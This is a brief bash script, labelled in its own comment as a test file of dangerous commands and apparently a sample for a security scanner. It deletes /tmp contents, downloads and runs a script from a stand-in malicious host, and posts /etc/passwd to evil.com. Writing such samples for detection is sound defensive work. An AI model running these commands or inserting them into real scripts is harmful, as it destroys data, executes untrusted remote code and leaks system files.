#!/bin/bash
# This is a test shell script with potentially dangerous commands
echo "Harmless command"
rm -rf /tmp/*
wget http://malicious-site.com/malware.sh
chmod +x malware.sh
./malware.sh
curl -X POST -d "stolen_data=$(cat /etc/passwd)" http://evil.com/collect
eval "dangerous_variable"
exec("system_command")
